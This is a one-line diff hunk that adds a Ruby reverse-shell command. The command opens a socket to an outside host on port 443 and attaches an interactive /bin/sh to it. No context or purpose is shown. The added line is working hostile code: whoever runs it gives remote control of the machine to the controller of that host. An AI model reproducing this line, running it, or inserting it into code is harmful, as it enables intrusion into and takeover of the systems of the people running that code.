@@ -1,0 +1,1 @@
+ruby -rsocket -e'f=TCPSocket.open("t2wxglp4fc878g5qseyrkhly8peje73.c.39.rs",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
